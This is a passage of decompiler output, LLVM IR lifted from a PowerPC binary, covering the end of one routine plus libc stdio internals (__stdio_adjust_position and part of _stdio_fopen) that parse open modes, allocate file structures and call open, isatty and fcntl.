dec_label_pc_10013e30:                            ; preds = %dec_label_pc_10013e18
  %v0_10013e30 = load i32, i32* @r31, align 4
  %v1_10013e30 = inttoptr i32 %v0_10013e30 to i16*
  %v2_10013e30 = load i16, i16* %v1_10013e30, align 2
  %v3_10013e30 = zext i16 %v2_10013e30 to i32
  store i32 %v3_10013e30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10013e38 = add i32 %v0_10013e30, 8
  %v2_10013e38 = inttoptr i32 %v1_10013e38 to i32*
  %v3_10013e38 = load i32, i32* %v2_10013e38, align 4
  store i32 %v3_10013e38, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_10013e40 = and i32 %v3_10013e30, 65464
  store i32 %v1_10013e40, i32* %r0.global-to-local, align 4
  %v3_10013e44 = add i32 %v0_10013e30, 2
  %v4_10013e44 = inttoptr i32 %v3_10013e44 to i8*
  store i8 0, i8* %v4_10013e44, align 1
  %v0_10013e48 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e48 = load i32, i32* @r31, align 4
  %v2_10013e48 = add i32 %v1_10013e48, 28
  %v3_10013e48 = inttoptr i32 %v2_10013e48 to i32*
  store i32 %v0_10013e48, i32* %v3_10013e48, align 4
  %v0_10013e4c = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e4c = trunc i32 %v0_10013e4c to i16
  %v2_10013e4c = load i32, i32* @r31, align 4
  %v3_10013e4c = inttoptr i32 %v2_10013e4c to i16*
  store i16 %v1_10013e4c, i16* %v3_10013e4c, align 2
  %v0_10013e50 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e50 = load i32, i32* @r31, align 4
  %v2_10013e50 = add i32 %v1_10013e50, 16
  %v3_10013e50 = inttoptr i32 %v2_10013e50 to i32*
  store i32 %v0_10013e50, i32* %v3_10013e50, align 4
  %v0_10013e54 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e54 = load i32, i32* @r31, align 4
  %v2_10013e54 = add i32 %v1_10013e54, 20
  %v3_10013e54 = inttoptr i32 %v2_10013e54 to i32*
  store i32 %v0_10013e54, i32* %v3_10013e54, align 4
  %v0_10013e58 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e58 = load i32, i32* @r31, align 4
  %v2_10013e58 = add i32 %v1_10013e58, 24
  %v3_10013e58 = inttoptr i32 %v2_10013e58 to i32*
  store i32 %v0_10013e58, i32* %v3_10013e58, align 4
  %v0_10013e5c = load i32, i32* %r11.global-to-local, align 4
  %v1_10013e5c = load i32, i32* @r31, align 4
  %v2_10013e5c = add i32 %v1_10013e5c, 44
  %v3_10013e5c = inttoptr i32 %v2_10013e5c to i32*
  store i32 %v0_10013e5c, i32* %v3_10013e5c, align 4
  br label %dec_label_pc_10013e68

dec_label_pc_10013e64:                            ; preds = %dec_label_pc_10013dec, %dec_label_pc_10013e18, %dec_label_pc_10013e04
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_10013e68

dec_label_pc_10013e68:                            ; preds = %dec_label_pc_10013e30, %dec_label_pc_10013e64
  %v0_10013e68 = load i32, i32* @r28, align 4
  %v3_10013e68 = icmp eq i32 %v0_10013e68, 0
  br i1 %v3_10013e68, label %dec_label_pc_10013e70, label %dec_label_pc_10013e7c

dec_label_pc_10013e70:                            ; preds = %dec_label_pc_10013e68
  %v2_10013e70 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10013e70, i32* @r3, align 4
  %v0_10013e78 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10013e7c

dec_label_pc_10013e7c:                            ; preds = %dec_label_pc_10013e68, %dec_label_pc_10013da0, %dec_label_pc_10013e70
  store i32 %v0_10013d7c, i32* %r0.global-to-local, align 4
  %v0_10013e80 = load i32, i32* @r30, align 4
  ret i32 %v0_10013e80

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10013e7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013e68, { 1, 0 }
  uselistorder label %dec_label_pc_10013e64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10013e18, { 1, 0 }
  uselistorder label %dec_label_pc_10013de0, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_10013eac = load i16, i16* %arg1, align 2
  %v4_10013eac = zext i16 %v3_10013eac to i32
  %tmp9 = urem i16 %v3_10013eac, 4
  %v3_10013eb0 = icmp eq i16 %tmp9, 0
  br i1 %v3_10013eb0, label %dec_label_pc_10013efc, label %dec_label_pc_10013eb8

dec_label_pc_10013eb8:                            ; preds = %entry
  %v1_10013eb0 = zext i16 %tmp9 to i32
  %v1_10013eb8 = add nsw i32 %v1_10013eb0, -1
  store i32 %v1_10013eb8, i32* %r10.global-to-local, align 4
  %v4_10013eb8 = icmp eq i32 %v1_10013eb8, 0
  br i1 %v4_10013eb8, label %dec_label_pc_10013efc, label %dec_label_pc_10013ec0

dec_label_pc_10013ec0:                            ; preds = %dec_label_pc_10013eb8
  %v1_10013ec0 = and i32 %v4_10013eac, 2048
  %v3_10013ec0 = icmp eq i32 %v1_10013ec0, 0
  br i1 %v3_10013ec0, label %dec_label_pc_10013efc, label %dec_label_pc_10013ec8

dec_label_pc_10013ec8:                            ; preds = %dec_label_pc_10013ec0
  %v2_10013ec8 = icmp sgt i32 %v1_10013eb8, 1
  br i1 %v2_10013ec8, label %dec_label_pc_10013f74, label %dec_label_pc_10013ed0

dec_label_pc_10013ed0:                            ; preds = %dec_label_pc_10013ec8
  %v2_10013ed0 = add i32 %tmp, 40
  %v3_10013ed0 = inttoptr i32 %v2_10013ed0 to i32*
  %v4_10013ed0 = load i32, i32* %v3_10013ed0, align 4
  %v3_10013ed4 = icmp eq i32 %v4_10013ed0, 0
  br i1 %v3_10013ed4, label %dec_label_pc_10013edc, label %dec_label_pc_10013f74

dec_label_pc_10013edc:                            ; preds = %dec_label_pc_10013ed0
  %v2_10013edc = add i32 %tmp, 44
  %v3_10013edc = inttoptr i32 %v2_10013edc to i32*
  %v4_10013edc = load i32, i32* %v3_10013edc, align 4
  %v2_10013ee0 = add i32 %tmp, 3
  %v3_10013ee0 = inttoptr i32 %v2_10013ee0 to i8*
  %v4_10013ee0 = load i8, i8* %v3_10013ee0, align 1
  %v5_10013ee0 = zext i8 %v4_10013ee0 to i32
  %v2_10013ee8 = sub nsw i32 %v1_10013eb8, %v5_10013ee0
  %v1_10013eec = add nsw i32 %v2_10013ee8, -1
  store i32 %v1_10013eec, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_10013edc, 1
  br i1 %tmp7, label %dec_label_pc_10013efc, label %dec_label_pc_10013ef4

dec_label_pc_10013ef4:                            ; preds = %dec_label_pc_10013edc
  %v2_10013ef4 = add i32 %tmp, 2
  %v3_10013ef4 = inttoptr i32 %v2_10013ef4 to i8*
  %v4_10013ef4 = load i8, i8* %v3_10013ef4, align 1
  %v5_10013ef4 = zext i8 %v4_10013ef4 to i32
  %v2_10013ef8 = sub nsw i32 %v1_10013eec, %v5_10013ef4
  store i32 %v2_10013ef8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10013efc

dec_label_pc_10013efc:                            ; preds = %dec_label_pc_10013edc, %dec_label_pc_10013ec0, %dec_label_pc_10013eb8, %entry, %dec_label_pc_10013ef4
  %v0_10013f20 = phi i32 [ %v1_10013eec, %dec_label_pc_10013edc ], [ %v1_10013eb8, %dec_label_pc_10013ec0 ], [ 0, %dec_label_pc_10013eb8 ], [ 0, %entry ], [ %v2_10013ef8, %dec_label_pc_10013ef4 ]
  %v1_10013efc = and i32 %v4_10013eac, 64
  %v3_10013efc = icmp eq i32 %v1_10013efc, 0
  %storemerge.in.in.v = select i1 %v3_10013efc, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10013f10 = add i32 %tmp, 16
  %v3_10013f10 = inttoptr i32 %v2_10013f10 to i32*
  %v4_10013f10 = load i32, i32* %v3_10013f10, align 4
  %v1_10013f14 = inttoptr i32 %arg2 to i32*
  %v2_10013f14 = load i32, i32* %v1_10013f14, align 4
  store i32 %v2_10013f14, i32* %r4.global-to-local, align 4
  %v2_10013f18 = sub i32 %storemerge, %v4_10013f10
  %v1_10013f1c = add i32 %arg2, 4
  %v2_10013f1c = inttoptr i32 %v1_10013f1c to i32*
  %v3_10013f1c = load i32, i32* %v2_10013f1c, align 4
  store i32 %v3_10013f1c, i32* %r5.global-to-local, align 4
  %v2_10013f20 = add i32 %v2_10013f18, %v0_10013f20
  store i32 %v2_10013f20, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10013f20, 0
  %v1_10013f28 = zext i1 %tmp10 to i32
  %v2_10013f28 = ashr i32 %v2_10013f20, 31
  %v3_10013f28 = and i32 %v2_10013f28, -2
  %v4_10013f28 = or i32 %v3_10013f28, %v1_10013f28
  %v2_10013f2c = sub i32 %v3_10013f1c, %v2_10013f20
  %v3_10013f2c = sub i32 -1, %v2_10013f20
  store i32 %v2_10013f2c, i32* %r10.global-to-local, align 4
  %v6_10013f2c = icmp ule i32 %v2_10013f2c, %v3_10013f2c
  %v2_10013f30 = sub nsw i32 -1, %v4_10013f28
  %v3_10013f30 = add i32 %v2_10013f14, %v2_10013f30
  %v5_10013f30 = zext i1 %v6_10013f2c to i32
  %v6_10013f30 = add i32 %v3_10013f30, %v5_10013f30
  store i32 %v6_10013f30, i32* %v1_10013f14, align 4
  %v0_10013f38 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013f38 = load i32, i32* %r8.global-to-local, align 4
  %v2_10013f38 = add i32 %v1_10013f38, 4
  %v3_10013f38 = inttoptr i32 %v2_10013f38 to i32*
  store i32 %v0_10013f38, i32* %v3_10013f38, align 4
  %v0_10013f3c = load i32, i32* %r8.global-to-local, align 4
  %v1_10013f3c = inttoptr i32 %v0_10013f3c to i32*
  %v2_10013f3c = load i32, i32* %v1_10013f3c, align 4
  %v1_10013f40 = load i32, i32* %r4.global-to-local, align 4
  %v3_10013f40 = icmp sgt i32 %v2_10013f3c, %v1_10013f40
  br i1 %v3_10013f40, label %dec_label_pc_10013f58, label %dec_label_pc_10013f48

dec_label_pc_10013f48:                            ; preds = %dec_label_pc_10013efc
  %v4_10013f40 = icmp eq i32 %v2_10013f3c, %v1_10013f40
  br i1 %v4_10013f40, label %dec_label_pc_10013f4c, label %dec_label_pc_10013f5cthread-pre-split

dec_label_pc_10013f4c:                            ; preds = %dec_label_pc_10013f48
  %v1_10013f4c = add i32 %v0_10013f3c, 4
  %v2_10013f4c = inttoptr i32 %v1_10013f4c to i32*
  %v3_10013f4c = load i32, i32* %v2_10013f4c, align 4
  %v1_10013f50 = load i32, i32* %r5.global-to-local, align 4
  %v3_10013f50 = icmp ugt i32 %v3_10013f4c, %v1_10013f50
  br i1 %v3_10013f50, label %dec_label_pc_10013f58, label %dec_label_pc_10013f5cthread-pre-split

dec_label_pc_10013f58:                            ; preds = %dec_label_pc_10013f4c, %dec_label_pc_10013efc
  %v0_10013f58 = load i32, i32* %r31.global-to-local, align 4
  %v1_10013f58 = sub i32 0, %v0_10013f58
  store i32 %v1_10013f58, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013f5c

dec_label_pc_10013f5cthread-pre-split:            ; preds = %dec_label_pc_10013f48, %dec_label_pc_10013f4c
  %v0_10013f5c.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013f5c

dec_label_pc_10013f5c:                            ; preds = %dec_label_pc_10013f5cthread-pre-split, %dec_label_pc_10013f58
  %v0_10013f5c = phi i32 [ %v0_10013f5c.pr, %dec_label_pc_10013f5cthread-pre-split ], [ %v1_10013f58, %dec_label_pc_10013f58 ]
  %tmp8 = icmp sgt i32 %v0_10013f5c, -1
  br i1 %tmp8, label %dec_label_pc_10013f78, label %dec_label_pc_10013f64

dec_label_pc_10013f64:                            ; preds = %dec_label_pc_10013f5c
  %v0_10013f64 = call i32 @__errno_location()
  %v2_10013f6c = inttoptr i32 %v0_10013f64 to i32*
  store i32 75, i32* %v2_10013f6c, align 4
  %v0_10013f7c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013f78

dec_label_pc_10013f74:                            ; preds = %dec_label_pc_10013ed0, %dec_label_pc_10013ec8
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013f78

dec_label_pc_10013f78:                            ; preds = %dec_label_pc_10013f5c, %dec_label_pc_10013f64, %dec_label_pc_10013f74
  %v0_10013f7c = phi i32 [ %v0_10013f5c, %dec_label_pc_10013f5c ], [ %v0_10013f7c.pre, %dec_label_pc_10013f64 ], [ -1, %dec_label_pc_10013f74 ]
  ret i32 %v0_10013f7c

; uselistorder directives
  uselistorder i32 %v2_10013f3c, { 1, 0 }
  uselistorder i32 %v2_10013f20, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 2048, { 2, 3, 4, 5, 0, 1 }
  uselistorder label %dec_label_pc_10013f78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013f5cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10013efc, { 4, 0, 1, 2, 3 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10013f90 = load i32, i32* @lr, align 4
  store i32 %v0_10013f90, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10013fa4 = load i32, i32* @r5, align 4
  store i32 %v0_10013fa4, i32* @r31, align 4
  %v0_10013fa8 = load i32, i32* @r6, align 4
  store i32 %v0_10013fa8, i32* @r29, align 4
  %v3_10013fac = load i8, i8* %arg2, align 1
  %v4_10013fac = zext i8 %v3_10013fac to i32
  store i32 %v4_10013fac, i32* %r0.global-to-local, align 4
  %v3_10013fb0 = icmp eq i8 %v3_10013fac, 114
  br i1 %v3_10013fb0, label %dec_label_pc_10013ffc, label %dec_label_pc_10013fb8

dec_label_pc_10013fb8:                            ; preds = %entry
  %v3_10013fb8 = icmp eq i8 %v3_10013fac, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10013fb8, label %dec_label_pc_10014000, label %dec_label_pc_10013fc4

dec_label_pc_10013fc4:                            ; preds = %dec_label_pc_10013fb8
  %v3_10013fc4 = icmp eq i8 %v3_10013fac, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10013fc4, label %dec_label_pc_10014000, label %dec_label_pc_10013fd0

dec_label_pc_10013fd0:                            ; preds = %dec_label_pc_10014090, %dec_label_pc_10014060, %dec_label_pc_10013fc4
  %v0_10013fd0 = call i32 @__errno_location()
  %v0_10013fd4 = load i32, i32* @r31, align 4
  %v3_10013fd4 = icmp eq i32 %v0_10013fd4, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10013fdc = inttoptr i32 %v0_10013fd0 to i32*
  store i32 22, i32* %v2_10013fdc, align 4
  br i1 %v3_10013fd4, label %dec_label_pc_10014230, label %dec_label_pc_10013fe4

dec_label_pc_10013fe4:                            ; preds = %dec_label_pc_100140c4, %dec_label_pc_10013fd0
  %v0_10013fe4 = load i32, i32* @r31, align 4
  %v1_10013fe4 = inttoptr i32 %v0_10013fe4 to i16*
  %v2_10013fe4 = load i16, i16* %v1_10013fe4, align 2
  %v3_10013fe4 = zext i16 %v2_10013fe4 to i32
  store i32 %v3_10013fe4, i32* %r0.global-to-local, align 4
  %v1_10013fe8 = and i32 %v3_10013fe4, 8192
  store i32 %v1_10013fe8, i32* %r9.global-to-local, align 4
  %v3_10013fe8 = icmp eq i32 %v1_10013fe8, 0
  store i1 %v3_10013fe8, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10013fe8, label %dec_label_pc_10014230, label %dec_label_pc_10013ff0

dec_label_pc_10013ff0:                            ; preds = %dec_label_pc_10013fe4
  store i32 ptrtoint (i32* @global_var_10013ff8.712 to i32), i32* @lr, align 4
  %v2_10013ff4 = call i32 @free(i32 %v0_10013fe4)
  br label %dec_label_pc_10014230

dec_label_pc_10013ffc:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10014000

dec_label_pc_10014000:                            ; preds = %dec_label_pc_10013fc4, %dec_label_pc_10013fb8, %dec_label_pc_10013ffc
  %v0_10014020 = phi i32 [ 1089, %dec_label_pc_10013fc4 ], [ 577, %dec_label_pc_10013fb8 ], [ 1, %dec_label_pc_10013ffc ]
  %v2_10014000 = add i32 %tmp, 1
  %v3_10014000 = inttoptr i32 %v2_10014000 to i8*
  %v4_10014000 = load i8, i8* %v3_10014000, align 1
  %v5_10014000 = zext i8 %v4_10014000 to i32
  store i32 %v5_10014000, i32* %r0.global-to-local, align 4
  %v3_10014008 = icmp eq i8 %v4_10014000, 98
  br i1 %v3_10014008, label %dec_label_pc_10014014, label %dec_label_pc_10014010

dec_label_pc_10014010:                            ; preds = %dec_label_pc_10014000
  br label %dec_label_pc_10014014

dec_label_pc_10014014:                            ; preds = %dec_label_pc_10014000, %dec_label_pc_10014010
  %storemerge = phi i32 [ %tmp, %dec_label_pc_10014010 ], [ %v2_10014000, %dec_label_pc_10014000 ]
  %v0_10014014 = phi i32 [ %tmp, %dec_label_pc_10014010 ], [ %v2_10014000, %dec_label_pc_10014000 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10014014 = add i32 %v0_10014014, 1
  %v2_10014014 = inttoptr i32 %v1_10014014 to i8*
  %v3_10014014 = load i8, i8* %v2_10014014, align 1
  %v4_10014014 = zext i8 %v3_10014014 to i32
  store i32 %v4_10014014, i32* %r0.global-to-local, align 4
  %v3_10014018 = icmp eq i8 %v3_10014014, 43
  br i1 %v3_10014018, label %dec_label_pc_10014020, label %dec_label_pc_10014028

dec_label_pc_10014020:                            ; preds = %dec_label_pc_10014014
  store i32 %v0_10014020, i32* %r9.global-to-local, align 4
  %v1_10014024 = add nuw nsw i32 %v0_10014020, 1
  store i32 %v1_10014024, i32* @r28, align 4
  br label %dec_label_pc_10014028

dec_label_pc_10014028:                            ; preds = %dec_label_pc_10014014, %dec_label_pc_10014020
  %v3_10014028 = icmp eq i32 %v0_10013fa4, 0
  br i1 %v3_10014028, label %dec_label_pc_10014030, label %dec_label_pc_10014058

dec_label_pc_10014030:                            ; preds = %dec_label_pc_10014028
  store i32 268517432, i32* @lr, align 4
  %v1_10014034 = call i32 @malloc(i32 80)
  store i32 %v1_10014034, i32* @r31, align 4
  %v4_10014038 = icmp eq i32 %v1_10014034, 0
  store i1 %v4_10014038, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_10014038, label %dec_label_pc_10014234, label %dec_label_pc_10014040

dec_label_pc_10014040:                            ; preds = %dec_label_pc_10014030
  %v1_10014044 = add i32 %v1_10014034, 56
  store i32 %v1_10014044, i32* @r3, align 4
  %v3_10014048 = inttoptr i32 %v1_10014034 to i16*
  store i16 8192, i16* %v3_10014048, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10014050 = load i32, i32* @r31, align 4
  %v2_10014050 = add i32 %v1_10014050, 8
  %v3_10014050 = inttoptr i32 %v2_10014050 to i32*
  store i32 0, i32* %v3_10014050, align 4
  store i32 268517464, i32* @lr, align 4
  %v0_10014054 = call i32 @__stdio_init_mutex()
  %v0_10014058.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10014058

dec_label_pc_10014058:                            ; preds = %dec_label_pc_10014028, %dec_label_pc_10014040
  %v0_100140b8 = phi i32 [ %v0_10013fa8, %dec_label_pc_10014028 ], [ %v0_10014058.pre, %dec_label_pc_10014040 ]
  %v1_10014058 = icmp slt i32 %v0_100140b8, 0
  br i1 %v1_10014058, label %dec_label_pc_100140b8, label %dec_label_pc_10014060

dec_label_pc_10014060:                            ; preds = %dec_label_pc_10014058
  %v1_10014064 = add i32 %arg1, 1
  store i32 %v1_10014064, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_1001406c = load i32, i32* @r31, align 4
  %v2_1001406c = add i32 %v1_1001406c, 4
  %v3_1001406c = inttoptr i32 %v2_1001406c to i32*
  store i32 %v0_100140b8, i32* %v3_1001406c, align 4
  %v0_10014070 = load i32, i32* @r28, align 4
  %v1_10014070 = load i32, i32* %r9.global-to-local, align 4
  %v2_10014070 = and i32 %v1_10014070, %v0_10014070
  %v1_10014074 = add i32 %v2_10014070, 1
  store i32 %v1_10014074, i32* %r9.global-to-local, align 4
  %v1_10014078 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014078 = and i32 %v1_10014078, %v1_10014074
  store i32 %v2_10014078, i32* %r0.global-to-local, align 4
  %v4_1001407c = icmp eq i32 %v2_10014078, %v1_10014074
  br i1 %v4_1001407c, label %dec_label_pc_10014084, label %dec_label_pc_10013fd0

dec_label_pc_10014084:                            ; preds = %dec_label_pc_10014060
  %v2_10014084 = sub i32 -1, %arg1
  %v3_10014084 = and i32 %v0_10014070, %v2_10014084
  store i32 %v3_10014084, i32* %r0.global-to-local, align 4
  %v1_10014088 = and i32 %v3_10014084, 1024
  store i32 %v1_10014088, i32* %r9.global-to-local, align 4
  %v3_10014088 = icmp eq i32 %v1_10014088, 0
  store i1 %v3_10014088, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10014088, label %dec_label_pc_100140ac, label %dec_label_pc_10014090

dec_label_pc_10014090:                            ; preds = %dec_label_pc_10014084
  %v0_10014090 = load i32, i32* @r29, align 4
  store i32 268517540, i32* @lr, align 4
  %v2_100140a0 = call i32 @__libc_fcntl(i32 %v0_10014090, i32 4)
  %v3_100140a4 = icmp eq i32 %v2_100140a0, 0
  br i1 %v3_100140a4, label %dec_label_pc_100140ac, label %dec_label_pc_10013fd0

dec_label_pc_100140ac:                            ; preds = %dec_label_pc_10014090, %dec_label_pc_10014084
  %v1_100140ac = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_100140ac, i32* %r0.global-to-local, align 4
  %v0_100140b0 = load i32, i32* @r28, align 4
  %v2_100140b0 = or i32 %v0_100140b0, %v1_100140ac
  store i32 %v2_100140b0, i32* @r28, align 4
  br label %dec_label_pc_100140e4

dec_label_pc_100140b8:                            ; preds = %dec_label_pc_10014058
  %v3_100140b8 = icmp eq i32 %v0_100140b8, -1
  %v0_100140c8.pre = load i32, i32* @r28, align 4
  br i1 %v3_100140b8, label %dec_label_pc_100140c4, label %dec_label_pc_100140c0

dec_label_pc_100140c0:                            ; preds = %dec_label_pc_100140b8
  %v1_100140c0 = or i32 %v0_100140c8.pre, 65536
  store i32 %v1_100140c0, i32* @r28, align 4
  br label %dec_label_pc_100140c4

dec_label_pc_100140c4:                            ; preds = %dec_label_pc_100140b8, %dec_label_pc_100140c0
  %v0_100140c8 = phi i32 [ %v1_100140c0, %dec_label_pc_100140c0 ], [ %v0_100140c8.pre, %dec_label_pc_100140b8 ]
  store i32 438, i32* @r5, align 4
  store i32 268517592, i32* @lr, align 4
  %v2_100140d4 = call i32 @__libc_open(i32 %arg1, i32 %v0_100140c8)
  %v1_100140d8 = icmp slt i32 %v2_100140d4, 0
  %v1_100140dc = load i32, i32* @r31, align 4
  %v2_100140dc = add i32 %v1_100140dc, 4
  %v3_100140dc = inttoptr i32 %v2_100140dc to i32*
  store i32 %v2_100140d4, i32* %v3_100140dc, align 4
  br i1 %v1_100140d8, label %dec_label_pc_10013fe4, label %dec_label_pc_100140c4.dec_label_pc_100140e4_crit_edge

dec_label_pc_100140c4.dec_label_pc_100140e4_crit_edge: ; preds = %dec_label_pc_100140c4
  %v0_100140e8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100140e4

dec_label_pc_100140e4:                            ; preds = %dec_label_pc_100140c4.dec_label_pc_100140e4_crit_edge, %dec_label_pc_100140ac
  %v0_100140e8 = phi i32 [ %v0_100140e8.pre, %dec_label_pc_100140c4.dec_label_pc_100140e4_crit_edge ], [ %v2_100140b0, %dec_label_pc_100140ac ]
  %v0_100140e4 = load i32, i32* @r31, align 4
  %v1_100140e4 = inttoptr i32 %v0_100140e4 to i16*
  %v2_100140e4 = load i16, i16* %v1_100140e4, align 2
  %v3_100140e4 = zext i16 %v2_100140e4 to i32
  store i32 %v3_100140e4, i32* %r0.global-to-local, align 4
  %v1_100140e8 = urem i32 %v0_100140e8, 4
  store i32 %v1_100140e8, i32* %r29.global-to-local, align 4
  %v1_100140ec = call i32 @__asm_rlwinm(i32 %v0_100140e8, i32 0, i32 21, i32 21)
  %v1_100140f0 = add nuw nsw i32 %v1_100140e8, 1
  store i32 %v1_100140f0, i32* %r29.global-to-local, align 4
  %v1_100140f4 = call i32 @__asm_rlwinm(i32 %v3_100140e4, i32 0, i32 18, i32 18)
  store i32 %v1_100140f4, i32* %r0.global-to-local, align 4
  %v1_100140f8 = xor i32 %v1_100140f0, 3
  store i32 %v1_100140f8, i32* %r29.global-to-local, align 4
  %v1_100140fc = urem i32 %v1_100140f4, 65536
  store i32 %v1_100140fc, i32* %r9.global-to-local, align 4
  %v0_10014100 = load i32, i32* @r28, align 4
  %v1_10014100 = call i32 @__asm_rlwinm(i32 %v0_10014100, i32 31, i32 16, i32 16)
  %v2_10014104 = or i32 %v1_10014100, %v1_100140ec
  store i32 %v2_10014104, i32* %r0.global-to-local, align 4
  %v0_10014108 = load i32, i32* %r29.global-to-local, align 4
  %v1_10014108 = mul i32 %v0_10014108, 16
  %v0_1001410c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001410c = or i32 %v0_1001410c, %v2_10014104
  store i32 %v2_1001410c, i32* %r9.global-to-local, align 4
  %v2_10014110 = or i32 %v2_1001410c, %v1_10014108
  store i32 %v2_10014110, i32* @r29, align 4
  %v1_10014114 = trunc i32 %v2_10014110 to i16
  %v2_10014114 = load i32, i32* @r31, align 4
  %v3_10014114 = inttoptr i32 %v2_10014114 to i16*
  store i16 %v1_10014114, i16* %v3_10014114, align 2
  %v0_10014118 = call i32 @__errno_location()
  store i32 %v0_10014118, i32* @r28, align 4
  %v0_10014120 = load i32, i32* @r31, align 4
  %v1_10014120 = add i32 %v0_10014120, 4
  %v2_10014120 = inttoptr i32 %v1_10014120 to i32*
  %v3_10014120 = load i32, i32* %v2_10014120, align 4
  %v1_10014124 = inttoptr i32 %v0_10014118 to i32*
  %v2_10014124 = load i32, i32* %v1_10014124, align 4
  store i32 %v2_10014124, i32* @r27, align 4
  store i32 268517676, i32* @lr, align 4
  %v1_10014128 = call i32 @isatty(i32 %v3_10014120)
  %v1_1001412c = mul i32 %v1_10014128, 256
  %v0_10014130 = load i32, i32* @r29, align 4
  %v2_10014130 = or i32 %v0_10014130, %v1_1001412c
  store i32 %v2_10014130, i32* @r29, align 4
  %v1_10014134 = trunc i32 %v2_10014130 to i16
  %v2_10014134 = load i32, i32* @r31, align 4
  %v3_10014134 = inttoptr i32 %v2_10014134 to i16*
  store i16 %v1_10014134, i16* %v3_10014134, align 2
  %v0_10014138 = load i32, i32* @r27, align 4
  %v1_10014138 = load i32, i32* @r28, align 4
  %v2_10014138 = inttoptr i32 %v1_10014138 to i32*
  store i32 %v0_10014138, i32* %v2_10014138, align 4
  %v0_1001413c = load i32, i32* @r31, align 4
  %v1_1001413c = add i32 %v0_1001413c, 8
  %v2_1001413c = inttoptr i32 %v1_1001413c to i32*
  %v3_1001413c = load i32, i32* %v2_1001413c, align 4
  store i32 %v3_1001413c, i32* %r0.global-to-local, align 4
  %v3_10014140 = icmp eq i32 %v3_1001413c, 0
  br i1 %v3_10014140, label %dec_label_pc_10014148, label %dec_label_pc_10014178

dec_label_pc_10014148:                            ; preds = %dec_label_pc_100140e4
  store i32 268517712, i32* @lr, align 4
  %v1_1001414c = call i32 @malloc(i32 4096)
  %v3_10014150 = icmp eq i32 %v1_1001414c, 0
  %v1_10014154 = load i32, i32* @r31, align 4
  %v2_10014154 = add i32 %v1_10014154, 8
  %v3_10014154 = inttoptr i32 %v2_10014154 to i32*
  store i32 %v1_1001414c, i32* %v3_10014154, align 4
  %v1_10014174 = load i32, i32* @r31, align 4
  br i1 %v3_10014150, label %dec_label_pc_10014174, label %dec_label_pc_1001415c

dec_label_pc_1001415c:                            ; preds = %dec_label_pc_10014148
  %v1_1001415c = inttoptr i32 %v1_10014174 to i16*
  %v2_1001415c = load i16, i16* %v1_1001415c, align 2
  %v3_1001415c = zext i16 %v2_1001415c to i32
  store i32 %v3_1001415c, i32* %r0.global-to-local, align 4
  %v1_10014160 = add i32 %v1_1001414c, 4096
  store i32 %v1_10014160, i32* %r9.global-to-local, align 4
  %v2_10014164 = add i32 %v1_10014174, 12
